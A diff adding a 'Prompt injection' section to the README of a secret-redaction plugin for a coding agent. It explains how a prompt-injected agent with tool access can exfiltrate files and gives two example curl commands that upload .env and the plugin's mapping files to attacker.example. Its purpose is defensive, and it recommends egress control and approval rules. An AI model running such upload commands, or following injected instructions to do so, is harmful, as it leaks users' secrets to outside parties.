@@ -190,6 +190,56 @@ and MIME type.
 - The plugin is not a sandbox. It limits what reaches the model, but a
   prompt-injected model can still misuse tools that are allowed to run locally.
 
+## Prompt injection
+
+This plugin is a **model-context egress filter**, not a prompt-injection defense
+on its own.
+
+A prompt injection with tool access does not need the model to read a secret. It
+can ask a shell, HTTP or MCP tool to upload the file directly:
+
+```bash
+curl -F file=@.env https://attacker.example/collect
+tar czf - .rredact | curl --data-binary @- https://attacker.example/collect
+```
+
+The model never sees the values, and the tool result (`200 OK`) contains nothing
+to redact. The path guard blocks literal references to the known mapping files,
+but not `.env`, and it cannot stop obfuscated commands.
+
+Redaction still helps with:
+
+- secrets never entering the provider context (no repetition, less log or
+  training exposure, safer transcripts),
+- accidental leakage through model text, tool arguments, commits or URLs,
+- reducing what a compromised provider or a leaked transcript exposes.
+
+It does **not** replace:
+
+- network egress control (default-deny, allowlists, a proxy),
+- tool permissions and human approval for network or write actions,
+- a container/VM without secrets on the agent's filesystem,
+- short-lived, least-privilege credentials.
+
+Assume that a capable injection with shell or network access can exfiltrate any
+file the agent can read. Put secrets where the agent cannot read them, or run
+the agent without network access.
+
+OpenCode's permission system can require approval for shell and network tools:
+
+```jsonc
+{
+  "permissions": [
+    { "action": "shell", "resource": "*", "effect": "ask" },
+    { "action": "webfetch", "resource": "*", "effect": "ask" },
+    { "action": "read", "resource": "*.env", "effect": "ask" }
+  ]
+}
+```
+
+This is not a sandbox either: a broad `allow` or a saved approval reopens the
+path. Prefer a narrow shell allowlist and OS-level egress control.
+
 ## Restoring write/edit inputs
 
 When a tool reads a file, the model sees placeholders. If it then writes the
